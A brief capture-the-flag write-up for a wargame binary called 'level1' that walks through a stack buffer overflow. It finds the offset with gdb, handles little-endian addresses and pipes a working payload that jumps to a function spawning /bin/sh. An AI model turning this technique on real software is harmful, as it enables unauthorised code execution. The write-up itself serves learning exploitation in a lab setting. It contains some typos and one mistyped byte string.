# Ret to another func

### Find address of the winnig func 

```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

```bash
$> objdump level1 -D | grep run
08048444 <run>:
```

### Buffer overflow

```bash
gdb➤  r < <(python3 -c "print('a' * 80)"
stopped 0x61616161 in ?? (), reason: SIGSEGV)
```

[Understand leave and ret asm](https://github.com/Gottiee/asm#call-instruction)

### Overwrite eip pointer

#### Endiannes

```bash
$> readelf level1 -e | grep Data:
  Data:                              2's complement, little endian
```

little endian mean, least significant byte first, you need to swap your address: ```\x08\x04x\x84\x44``` become ```'\x44\x84\x04\x08```

```bash
python2.7 -c "import sys; sys.stdout.write(b'a' * 76 + b'\x44\x84\x04\x08')" | ./level1
Good... Wait what?
[1]    16661 done                              python3 -c  | 
       16662 segmentation fault (core dumped)  ./level1
```

It Worded but couldn't interact with the executable. There is a trick with cat :

```cat <(python /tmp/exec.py)- | ./exploit.me```

```cat <(python2.7 -c "import sys; sys.stdout.write(b'a' * 76 + b'\x44\x84\x04\x08')") - | ./level1```

[Here a pwn Cheat sheet](https://github.com/Gottiee/Hack-Tools/blob/main/pwn/pwn.md#usefull-cmd)